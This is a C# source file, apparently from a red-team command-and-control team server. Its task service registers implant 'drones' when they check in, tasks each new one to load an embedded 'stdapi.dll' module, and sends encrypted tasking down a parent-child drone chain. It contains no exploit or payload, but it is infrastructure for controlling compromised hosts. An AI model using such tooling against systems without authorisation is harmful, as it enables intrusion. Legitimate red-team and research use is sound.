using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

using Microsoft.AspNetCore.SignalR;

using TeamServer.Hubs;
using TeamServer.Interfaces;
using TeamServer.Models;

namespace TeamServer.Services
{
    public class TaskService : ITaskService
    {
        private readonly IServerService _server;
        private readonly IDroneService _drones;
        private readonly ICryptoService _crypto;
        private readonly IHubContext<MessageHub, IMessageHub> _hub;

        public TaskService(IServerService server, IDroneService drones, ICryptoService crypto, IHubContext<MessageHub, IMessageHub> hub)
        {
            _server = server;
            _drones = drones;
            _crypto = crypto;
            _hub = hub;
        }

        public async Task RecvC2Data(IEnumerable<MessageEnvelope> messages)
        {
            foreach (var message in messages)
                await _server.HandleC2Message(message);
        }

        public async Task<IEnumerable<MessageEnvelope>> GetDroneTasks(DroneMetadata metadata)
        {
            var drone = _drones.GetDrone(metadata.Guid);

            if (drone is null)
            {
                drone = new Drone(metadata);

                // may need to resend this
                drone.TaskDrone(new DroneTask("core", "load-module")
                {
                    Artefact = await Utilities.GetEmbeddedResource("stdapi.dll")
                });

                _drones.AddDrone(drone);
            }

            drone.CheckIn();
            await _hub.Clients.All.DroneCheckedIn(drone.Metadata);

            // create a new list of envelopes to send
            var envelopes = new List<MessageEnvelope>();

            // get a collection of all drones
            var allDrones = _drones.GetDrones().ToArray();
            
            // set the current "top-level" drones
            var currentParents = new[] { drone };
            
            while (true)
            {
                if (!currentParents.Any()) break;

                var allChildren = new List<Drone>();
                
                // iterate over each parent
                foreach (var parent in currentParents)
                {
                    var parentTasks = parent.GetPendingTasks().ToArray();
                    
                    if (parentTasks.Any())
                    {
                        var envelope = CreateEnvelopeFromTasks(parentTasks);
                        envelope.Drone = parent.Metadata.Guid;
                        envelopes.Add(envelope);
                    }

                    // get all drones that our current drones are parents for
                    var children = allDrones.Where(d => !string.IsNullOrWhiteSpace(d.Parent) && d.Parent.Equals(parent.Metadata.Guid)).ToArray();
                    if (children.Any()) allChildren.AddRange(children);
                }

                currentParents = allChildren.ToArray();
            }

            return envelopes;
        }

        private MessageEnvelope CreateEnvelopeFromTasks(IEnumerable<DroneTask> tasks)
        {
            var message = new C2Message(C2Message.MessageDirection.Downstream, C2Message.MessageType.DroneTask)
            {
                Data = tasks.Serialize()
            };

            return _crypto.EncryptMessage(message);
        }
    }
}